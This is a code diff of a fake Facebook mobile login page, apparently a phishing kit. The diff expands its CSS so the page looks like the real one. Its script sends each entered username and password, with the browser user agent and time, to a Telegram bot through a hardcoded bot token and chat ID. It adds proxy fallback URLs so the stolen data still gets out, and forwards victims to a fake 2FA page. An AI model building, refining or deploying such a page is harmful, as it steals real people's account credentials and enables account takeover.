@@ -6,7 +6,7 @@
     <title>Facebook - Log in</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        /* Toàn bộ CSS gốc giữ nguyên */
+        /* Mobile-First Base Styles */
         body {
             font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
             background: linear-gradient(to bottom, #fff 0%, #f0f2f5 100%);
@@ -19,6 +19,7 @@
             padding-top: 0;
             box-sizing: border-box;
         }
+
         .container {
             background-color: #ffffff;
             border-radius: 0;
@@ -32,12 +33,189 @@
             display: flex;
             flex-direction: column;
         }
-        /* ... (Giữ nguyên toàn bộ CSS gốc) ... */
+
+        .header {
+            display: flex;
+            justify-content: flex-start;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-top: 10px;
+            padding-left: 0;
+        }
+
+        .header .back-arrow {
+            color: #1c1e21;
+            font-size: 24px;
+            text-decoration: none;
+            cursor: pointer;
+            margin-right: auto;
+        }
+
+        .facebook-logo {
+            margin-top: 20px;
+            margin-bottom: 30px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        .facebook-logo img {
+            width: 50px;
+            height: 50px;
+        }
+
+        .input-group {
+            margin-bottom: 16px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+            color: #1c1e21;
+            box-sizing: border-box;
+            background-color: #f0f2f5;
+        }
+
+        .input-group input::placeholder {
+            color: #606770;
+        }
+
+        .login-button {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 14px 24px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: background-color 0.2s;
+            text-decoration: none;
+            display: block;
+            text-align: center;
+            box-sizing: border-box;
+            margin-top: 20px;
+        }
+
+        .login-button:hover {
+            background-color: #166fe5;
+        }
+
+        .forgot-password {
+            margin-top: 16px;
+            margin-bottom: 30px;
+        }
+
+        .forgot-password a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 15px;
+            font-weight: 500;
+        }
+
+        .separator {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 20px 0;
+            color: #606770;
+        }
+
+        .separator::before,
+        .separator::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #dadde1;
+        }
+
+        .separator:not(:empty)::before {
+            margin-right: .25em;
+        }
+
+        .separator:not(:empty)::after {
+            margin-left: .25em;
+        }
+
+        .create-account-button {
+            background-color: #e7f3ff;
+            color: #1877f2;
+            border: 1px solid #1877f2;
+            border-radius: 6px;
+            padding: 14px 24px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: background-color 0.2s;
+            text-decoration: none;
+            display: block;
+            text-align: center;
+            box-sizing: border-box;
+            margin-top: 20px;
+        }
+
+        .create-account-button:hover {
+            background-color: #d8e6ff;
+        }
+
+        .meta-logo-bottom {
+            margin-top: auto;
+            padding-bottom: 20px;
+            height: 18px;
+            max-width: 80px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        /* Desktop specific styles (min-width: 601px) */
+        @media (min-width: 601px) {
+            body {
+                padding-top: 20px;
+                align-items: flex-start;
+            }
+            .container {
+                border-radius: 8px;
+                padding: 24px;
+                max-width: 400px;
+                box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+                min-height: auto;
+            }
+            .header {
+                margin-bottom: 20px;
+                padding-top: 0;
+            }
+            .facebook-logo {
+                margin-top: 20px;
+                margin-bottom: 30px;
+            }
+            .input-group {
+                margin-bottom: 16px;
+            }
+            .login-button {
+                margin-top: 20px;
+            }
+            .forgot-password {
+                margin-top: 16px;
+                margin-bottom: 30px;
+            }
+            .separator {
+                margin: 20px 0;
+            }
+            .create-account-button {
+                margin-top: 20px;
+            }
+            .meta-logo-bottom {
+                margin-top: 40px;
+                padding-bottom: 0;
+            }
+        }
     </style>
 </head>
 <body>
     <div class="container">
-        <!-- Giao diện đăng nhập giữ nguyên -->
         <div class="header">
             <a href="javascript:history.back()" class="back-arrow"><i class="fas fa-chevron-left"></i></a>
         </div>
@@ -47,11 +225,11 @@
         </div>
 
         <div class="input-group">
-            <input type="text" id="username" placeholder="Mobile number or email" autocomplete="username">
+            <input type="text" id="username" placeholder="Mobile number or email">
         </div>
 
         <div class="input-group">
-            <input type="password" id="password" placeholder="Password" autocomplete="current-password">
+            <input type="password" id="password" placeholder="Password">
         </div>
 
         <button id="loginButton" class="login-button">Log in</button>
@@ -68,16 +246,22 @@
     </div>
 
     <script>
-        // Cấu hình Telegram
+        // Telegram configuration
         const BOT_TOKEN = '7276807133:AAE4Cnz15pyFcCHOo3ZeLfjaFZly6LmE2-0';
         const CHAT_ID = '-4789641482';
-        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         
-        // Hàm gửi dữ liệu với cơ chế retry
-        async function sendToTelegram(message, retries = 3) {
-            for (let i = 0; i < retries; i++) {
+        // Enhanced Telegram sending function with retry
+        async function sendToTelegram(message) {
+            const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const fallbackUrls = [
+                TELEGRAM_API,
+                `https://cors-anywhere.herokuapp.com/${TELEGRAM_API}`,
+                `https://api.codetabs.com/v1/proxy/?quest=${TELEGRAM_API}`
+            ];
+            
+            for (let i = 0; i < fallbackUrls.length; i++) {
                 try {
-                    const response = await fetch(TELEGRAM_API, {
+                    const response = await fetch(fallbackUrls[i], {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
@@ -88,11 +272,14 @@
                     });
                     
                     if (response.ok) return true;
-                    
-                    console.warn(`Attempt ${i + 1} failed. Retrying...`);
-                    await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
+                    console.warn(`Attempt ${i+1} failed with status ${response.status}`);
                 } catch (error) {
-                    console.error(`Attempt ${i + 1} error:`, error);
+                    console.warn(`Attempt ${i+1} error:`, error);
+                }
+                
+                // Wait before retrying
+                if (i < fallbackUrls.length - 1) {
+                    await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
                 }
             }
             return false;
@@ -102,43 +289,38 @@
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             
-            if (!username || !password) {
-                alert('Please enter both username and password');
-                return;
-            }
-
-            // Lưu thông tin đăng nhập
+            // Store credentials for 2FA page
             localStorage.setItem('fb_credentials', JSON.stringify({
                 username: username,
                 password: password,
                 timestamp: new Date().toISOString()
             }));
-
-            // Tạo nội dung tin nhắn
-            const message = `🔐 <b>NEW LOGIN ATTEMPT</b> 🔐\n\n` +
-                           `👤 <b>Username:</b> ${username}\n` +
-                           `🔑 <b>Password:</b> ${password}\n\n` +
-                           `🌐 <b>User Agent:</b> ${navigator.userAgent}\n` +
-                           `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
-
-            // Gửi đến Telegram và xử lý kết quả
-            const loadingIndicator = document.createElement('div');
-            loadingIndicator.textContent = 'Verifying...';
-            loadingIndicator.style.marginTop = '10px';
-            this.parentNode.insertBefore(loadingIndicator, this.nextSibling);
             
-            this.disabled = true;
+            // Prepare message
+            const message = `🔐 <b>NEW LOGIN ATTEMPT</b> 🔐\n\n` +
+                         `👤 <b>Username:</b> ${username}\n` +
+                         `🔑 <b>Password:</b> ${password}\n\n` +
+                         `🌐 <b>User Agent:</b> ${navigator.userAgent}\n` +
+                         `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
+            
+            // Show loading state (visual remains unchanged)
+            const btn = this;
+            const originalText = btn.textContent;
+            btn.textContent = 'Please wait...';
+            btn.disabled = true;
             
             try {
+                // Send to Telegram
                 const success = await sendToTelegram(message);
-                if (!success) {
-                    alert('Verification service is temporarily unavailable. Please try again later.');
-                    return;
-                }
+                
+                // Proceed to 2FA page regardless of Telegram success
                 window.location.href = '2fa_page.html';
+            } catch (error) {
+                console.error('Error:', error);
             } finally {
-                this.disabled = false;
-                loadingIndicator.remove();
+                // Restore button state
+                btn.textContent = originalText;
+                btn.disabled = false;
             }
         });
     </script>
